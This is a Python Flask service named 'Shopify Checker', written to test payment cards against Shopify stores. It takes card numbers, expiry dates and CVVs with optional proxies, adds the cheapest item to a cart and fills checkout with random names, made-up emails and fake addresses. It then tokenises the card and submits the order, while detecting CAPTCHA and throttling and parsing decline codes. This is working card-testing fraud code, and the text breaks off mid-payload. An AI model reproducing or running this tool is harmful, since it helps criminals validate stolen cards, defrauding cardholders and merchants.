"""
Shopify Checker  — Flask API
Railway-compatible: reads PORT from environment.

Endpoint:
  GET /DrGaM?site=<url>&cc=<CC|MM|YYYY|CVV>[&proxy=ip:port[&variant=id]]
"""

import asyncio
import aiohttp
import json
import re
import random
import os
from urllib.parse import urlparse
from flask import Flask, request, jsonify

# ── GraphQL queries (unchanged from original) ─────────────────────────────────
QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone __typename}__typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...on ProductVariantMerchandise{id __typename}...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}lineAllocations{...LineAllocationDetails __typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle methodType amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}__typename}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...on FilledDeliveryTerms{intermediateRates shippingRatesStatusToken deliveryLines{id destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle methodType amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands orderingIndex displayName extensibilityDisplayName __typename}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...on ProductVariantMerchandise{id __typename}...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}lineAllocations{...LineAllocationDetails __typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}buyerIdentity{...on FilledBuyerIdentityTerms{email phone __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}__typename}__typename}__typename}"""

QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL_SHIPPING  # reuse for delivery step

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage nonLocalizedMessage __typename}__typename}...on Throttled{pollAfter queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token orderStatusPageUrl paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}__typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationSchedulingFailure{__typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token orderStatusPageUrl paymentDetails{paymentCardBrand creditCardLastFourDigits __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}__typename}__typename}__typename}"""

# ── Currency → country map ────────────────────────────────────────────────────
C2C = {
    "USD":"US","CAD":"CA","INR":"IN","AED":"AE","HKD":"HK","GBP":"GB",
    "CHF":"CH","EUR":"DE","AUD":"AU","NZD":"NZ","JPY":"JP","SGD":"SG",
    "SEK":"SE","NOK":"NO","DKK":"DK","PLN":"PL","CZK":"CZ","MXN":"MX",
    "BRL":"BR","KRW":"KR","THB":"TH","MYR":"MY","PHP":"PH","IDR":"ID",
    "TWD":"TW","ZAR":"ZA","ILS":"IL","TRY":"TR","SAR":"SA","QAR":"QA",
    "KWD":"KW","CNY":"CN","HUF":"HU","RON":"RO","BGN":"BG","CLP":"CL",
    "COP":"CO","PEN":"PE","ARS":"AR",
}

book = {
    "US":  {"address1":"123 Main","city":"NY","postalCode":"10080","zoneCode":"NY","countryCode":"US","phone":"2194157586"},
    "CA":  {"address1":"88 Queen","city":"Toronto","postalCode":"M5J2J3","zoneCode":"ON","countryCode":"CA","phone":"4165550198"},
    "GB":  {"address1":"221B Baker Street","city":"London","postalCode":"NW1 6XE","zoneCode":"LND","countryCode":"GB","phone":"2079460123"},
    "IN":  {"address1":"221B MG","city":"Mumbai","postalCode":"400001","zoneCode":"MH","countryCode":"IN","phone":"+919876543210"},
    "AE":  {"address1":"Burj Tower","city":"Dubai","postalCode":"","zoneCode":"DU","countryCode":"AE","phone":"+97150123 4567"},
    "HK":  {"address1":"Nathan 88","city":"Kowloon","postalCode":"","zoneCode":"KL","countryCode":"HK","phone":"+85255555555"},
    "CN":  {"address1":"8 Zhongguancun","city":"Beijing","postalCode":"100080","zoneCode":"BJ","countryCode":"CN","phone":"1062512345"},
    "CH":  {"address1":"Gotthardstrasse 17","city":"Schweiz","postalCode":"6430","zoneCode":"SZ","countryCode":"CH","phone":"445512345"},
    "AU":  {"address1":"1 Martin Place","city":"Sydney","postalCode":"2000","zoneCode":"NSW","countryCode":"AU","phone":"291234567"},
    "DE":  {"address1":"Friedrichstr 100","city":"Berlin","postalCode":"10117","zoneCode":"BE","countryCode":"DE","phone":"3012345678"},
    "NZ":  {"address1":"1 Queen Street","city":"Auckland","postalCode":"1010","zoneCode":"AUK","countryCode":"NZ","phone":"91234567"},
    "JP":  {"address1":"1-1 Marunouchi","city":"Tokyo","postalCode":"100-0005","zoneCode":"JP-13","countryCode":"JP","phone":"312345678"},
    "SG":  {"address1":"1 Raffles Place","city":"Singapore","postalCode":"048616","zoneCode":"","countryCode":"SG","phone":"61234567"},
    "SE":  {"address1":"Drottninggatan 1","city":"Stockholm","postalCode":"11151","zoneCode":"","countryCode":"SE","phone":"812345678"},
    "NO":  {"address1":"Karl Johans gate 1","city":"Oslo","postalCode":"0154","zoneCode":"","countryCode":"NO","phone":"21234567"},
    "DK":  {"address1":"Stroget 1","city":"Copenhagen","postalCode":"1000","zoneCode":"","countryCode":"DK","phone":"31234567"},
    "FR":  {"address1":"1 Rue de Rivoli","city":"Paris","postalCode":"75001","zoneCode":"","countryCode":"FR","phone":"142345678"},
    "MX":  {"address1":"Reforma 222","city":"Mexico City","postalCode":"06600","zoneCode":"CDMX","countryCode":"MX","phone":"5512345678"},
    "BR":  {"address1":"Av Paulista 1000","city":"Sao Paulo","postalCode":"01310-100","zoneCode":"SP","countryCode":"BR","phone":"1112345678"},
    "DEFAULT": {"address1":"123 Main","city":"New York","postalCode":"10080","zoneCode":"NY","countryCode":"US","phone":"2194157586"},
}

# ── Helpers ───────────────────────────────────────────────────────────────────
def pick_addr(url, cc=None, rc=None):
    cc  = (cc or "").upper()
    rc  = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split(".")[-1].upper()
    if tcn in book:
        return book[tcn]
    ccn = C2C.get(cc)
    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            after = text.split(start, 1)[1]
            if end in after:
                result = after.split(end, 1)[0]
                return result if result else None
    except Exception:
        pass
    return None


def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    return None


def is_captcha_required(text):
    if not text:
        return False
    t = text.upper()
    for kw in ("CAPTCHA_REQUIRED", "CAPTCHA CHALLENGE", "HCAPTCHA", "H-CAPTCHA"):
        if kw in t:
            return True
    return False


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    patterns = [
        r"(PAYMENTS_[A-Z_]+)", r"(CARD_[A-Z_]+)",
        r"([A-Z]+_[A-Z]+_[A-Z_]+)", r"([A-Z]+_[A-Z_]+)",
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'\{"code":"([^"]+)"', r"'code':'([^']+)'",
    ]
    for pattern in patterns:
        for match in re.findall(pattern, message, re.IGNORECASE):
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                return match.strip("{}:'\" ")
    return message[:50]


class Utils:
    @staticmethod
    def get_random_name():
        firsts = ["James","John","Robert","Michael","William","David","Mary","Patricia","Jennifer","Linda"]
        lasts  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez"]
        return random.choice(firsts), random.choice(lasts)

    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com","yahoo.com","outlook.com","protonmail.com"]
        return f"{first.lower()}.{last.lower()}@{random.choice(domains)}"


# ── Async core ────────────────────────────────────────────────────────────────
async def make_graphql_request(session, graphql_url, params, headers, json_data, max_retries=1):
    for attempt in range(max_retries + 1):
        try:
            resp = await session.post(graphql_url, params=params, headers=headers, json=json_data)
            text = await resp.text()
            return resp, text
        except Exception as e:
            if attempt == max_retries:
                return None, str(e)
            await asyncio.sleep(1)
    return None, "max_retries_exceeded"


async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith("http"):
            domain = "https://" + domain
        connector = aiohttp.TCPConnector(ssl=False)
        timeout   = aiohttp.ClientTimeout(total=10)
        proxy     = parse_proxy(proxy_str)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json", proxy=proxy) as resp:
                if resp.status != 200:
                    return False, f"<b>Site Error! Status: {resp.status}</b>"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "<b>Not Shopify!</b>"
                result = (await resp.json())["products"]
                if not result:
                    return False, "<b>No Products!</b>"

        min_price, min_product = float("inf"), None
        for product in result:
            for variant in product.get("variants", []):
                if not variant.get("available", True):
                    continue
                try:
                    price = float(str(variant.get("price", "0")).replace(",", ""))
                    if price < min_price:
                        min_price   = price
                        min_product = {
                            "site": domain,
                            "price": f"{price:.2f}",
                            "variant_id": str(variant["id"]),
                            "link": f"{domain}/products/{product['handle']}",
                        }
                except (ValueError, TypeError):
                    continue

        if isinstance(min_product, dict) and min_product.get("variant_id"):
            return min_product
        return False, "<b>No Valid Products</b>"

    except aiohttp.ClientError as e:
        return False, f"<b>Proxy Error: {e}</b>"
    except Exception as e:
        return False, f"error: {e}"


async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway     = "UNKNOWN"
    total_price = "0.00"
    currency    = "USD"

    ourl  = site_url if site_url.startswith("http") else f"https://{site_url}"
    proxy = parse_proxy(proxy_str)
    checkpoint_data  = None
    running_total    = "0.00"
    payment_identifier = None

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": ourl,
            "Referer": ourl,
        }

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        firstName, lastName = Utils.get_random_name()
        email  = Utils.generate_email(firstName, lastName)
        phone  = address_info["phone"]
        street = address_info["address1"]
        city   = address_info["city"]
        state  = address_info["zoneCode"]
        s_zip  = address_info["postalCode"]
        address2 = ""

        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                return False, info[1], gateway, total_price, currency
            variant_id = info["variant_id"]

        connector = aiohttp.TCPConnector(ssl=False)
        timeout   = aiohttp.ClientTimeout(total=30)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            cart_url = ourl + "/cart/add.js"
            checkout = ourl + "/checkout/"

            cart_headers = {**headers, "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json"}
            cart_resp = await session.post(cart_url, data=f"id={variant_id}&quantity=1", headers=cart_headers, proxy=proxy)
            if cart_resp.status != 200:
                cart_resp = await session.post(cart_url, json={"items": [{"id": int(variant_id), "quantity": 1}]}, headers={**headers, "Accept": "application/json"}, proxy=proxy)
            if cart_resp.status != 200:
                return False, f"Cart failed status {cart_resp.status}", gateway, total_price, currency

            co_resp      = await session.post(checkout, allow_redirects=True, headers={**headers, "Accept": "text/html,application/xhtml+xml"}, proxy=proxy)
            checkout_url = str(co_resp.url)
            text         = await co_resp.text()

            at_match      = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
            attempt_token = at_match.group(1) if at_match else checkout_url.split("/")[-1].split("?")[0]

            sst = co_resp.headers.get("X-Checkout-One-Session-Token") or co_resp.headers.get("x-checkout-one-session-token")
            for pattern in ('name="serialized-sessionToken" content="&quot;', 'name="serialized-sessionToken" content="',
                            '"serializedSessionToken":"', 'data-session-token="', '"sessionToken":"'):
                if not sst:
                    end = "&quot;" if "&quot;" in pattern else '"'
                    sst = extract_between(text, pattern, end)

            if "login" in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency
            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(text, '"queueToken":"', '"')
            stableId   = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(text, '"stableId":"', '"')
            merch      = (extract_between(text, "ProductVariantMerchandise/", "&quot;") or
                          extract_between(text, "ProductVariantMerchandise/", "&q") or
                          extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                          str(variant_id))

            currency = "USD"
            for pat, end in [('currencyCode&quot;:&quot;', '&quot;'), ('"currencyCode":"', '"')]:
                v = extract_between(text, pat, end)
                if v:
                    currency = v
                    break

            subtotal = (extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or
                        extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"'))
            if not subtotal:
                pm = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = pm.group(1) if pm else "0.01"

            graphql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"
            params      = {"operationName": "Proposal"}

            json_data = {
                "query": QUERY_PROPOSAL_SHIPPING,
                "variables": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {"partialStreetAddress": {
                                "address1": street, "address2": address2, "city": city,
                                "countryCode": country_code, "postalCode": s_zip,
                                "firstName": firstName, "lastName": lastName,
                                "zoneCode": state, "phone": phone,
                            }},
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True,
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stableId or "1",
                            "merchandise": {"productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                            }},
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None, "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True}, "paymentLines": [],
                        "billingAddress": {"streetAddress": {
                            "address1": "", "city": "", "countryCode": country_code,
                            "lastName": "", "zoneCode": "ENG", "phone": "",
                        }},
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "operationName": "Proposal",
            }

            # two-pass shipping proposal
            for i in range(2):
                resp, resp_text = await make_graphql_request(session, graphql_url, params, headers, json_data)
                if i == 0:
                    await asyncio.sleep(3)

            if not resp:
                return False, f"Request failed: {resp_text}", gateway, total_price, currency
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            try:
                rj = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON: {e}", gateway, total_price, currency

            if "errors" in rj:
                msgs = [e.get("message", str(e)) for e in rj.get("errors", [])[:3]]
                return False, f"GraphQL Error: {'; '.join(msgs)}", gateway, total_price, currency

            session_node = rj.get("data", {}).get("session")
            if not session_node:
                return False, "Session is null", gateway, total_price, currency
            negotiate = session_node.get("negotiate")
            if not negotiate:
                return False, "Negotiate is null", gateway, total_price, currency
            result = negotiate.get("result")
            if not result:
                return False, "Result is null", gateway, total_price, currency

            rt = result.get("__typename", "")
            if rt == "CheckpointDenied":
                return False, "Checkpoint Denied", gateway, total_price, currency
            if rt == "Throttled":
                return False, "Throttled", gateway, total_price, currency
            if rt == "NegotiationResultFailed":
                return False, "Negotiation failed", gateway, total_price, currency

            checkpoint_data = result.get("checkpointData")
            seller          = result.get("sellerProposal")
            if not seller:
                return False, "Seller proposal is null", gateway, total_price, currency

            delivery_data   = seller.get("delivery")
            running_total_d = seller.get("runningTotal")
            if not running_total_d:
                return False, "No runningTotal", gateway, total_price, currency
            running_total = running_total_d["value"]["amount"]

            if not delivery_data:
                return False, "No delivery data", gateway, total_price, currency

            delivery_type     = delivery_data.get("__typename", "")
            delivery_strategy = ""
            shipping_amount   = 0.0

            if delivery_type == "FilledDeliveryTerms":
                dl = delivery_data.get("deliveryLines", [{}])
                if dl:
                    strats = dl[0].get("availableDeliveryStrategies", [])
                    if strats:
                        delivery_strategy = strats[0].get("handle", "")
                        try:
                            shipping_amount = float(strats[0].get("amount", {}).get("value", {}).get("amount", "0"))
                        except Exception:
                            shipping_amount = 0.0

            tax_amount = 0.0
            tax_data   = seller.get("tax", {})
            if tax_data and tax_data.get("__typename") == "FilledTaxTerms":
                try:
                    tax_amount = float(tax_data.get("totalTaxAmount", {}).get("value", {}).get("amount", "0"))
                except Exception:
                    pass

            pay_data = seller.get("payment", {})
            if pay_data and pay_data.get("__typename") == "FilledPaymentTerms":
                for method in pay_data.get("availablePaymentLines", []):
                    pm = method.get("paymentMethod", {})
                    if pm.get("paymentMethodIdentifier"):
                        payment_identifier = pm.get("paymentMethodIdentifier")
                        gateway            = pm.get("extensibilityDisplayName") or pm.get("name", "UNKNOWN")
                        total_price        = str(float(running_total) + shipping_amount + tax_amount)
                        break

            if not payment_identifier:
                return False, "No valid payment method", gateway, total_price, currency

            # delivery proposal
            json_data["query"] = QUERY_PROPOSAL_DELIVERY
            json_data["variables"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                "deliveryStrategyByHandle": {"handle": delivery_strategy, "customDeliveryRate": False},
                "options": {},
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["targetMerchandiseLines"] = {
                "lines": [{"stableId": stableId or "1"}]
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {
                "value": {"amount": str(shipping_amount), "currencyCode": currency}
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["destinationChanged"] = False
            json_data["variables"]["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": street, "address2": address2, "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": firstName, "lastName": lastName,
                    "zoneCode": state, "phone": phone,
                }
            }
            json_data["variables"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax_amount)

            await make_graphql_request(session, graphql_url, params, headers, json_data)

            # tokenise card
            formatted_card = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
            payload = {
                "credit_card": {
                    "month": mes, "name": f"{firstName} {lastName}",
                    "number": formatted_card, "verification_value": cvv,
                    "year": ano, "start_month": "", "start_year": "", "issue_number": "",
                },
                "payment_session_scope": f"www.{urlparse(ourl).netloc}",
            }
            tok_resp = await session.post("https://deposit.shopifycs.com/sessions", json=payload, proxy=proxy)
            try:
                token_data = await tok_resp.json()
                token = token_data.get("id")
                if not token:
                    return False, "Unable to get payment token", gateway, total_price, currency
            except Exception as e:
                return False, f"Unable to get payment token: {e}", gateway, total_price, currency

            # submit
            submit_vars = {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {"streetAddress": {
                                "address1": street, "address2": address2, "city": city,
                                "countryCode": country_code, "postalCode": s_zip,
                                "firstName": firstName, "lastName": lastName,
                                "zoneCode": state, "phone": phone,
                            }},
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {"handle": delivery_strategy, "customDeliveryRate": False},
                                "options": {"phone": phone},
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": stableId or "1"}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"value": {"amount": str(shipping_amount), "currencyCode": currency}},
                            "destinationChanged": False,
                        }],
                        "noDeliveryRequired": [], "useProgressiveRates": True,
                        "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stableId or "1",
                            "merchandise": {"productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                            }},
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None, "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {"directPaymentMethod": {
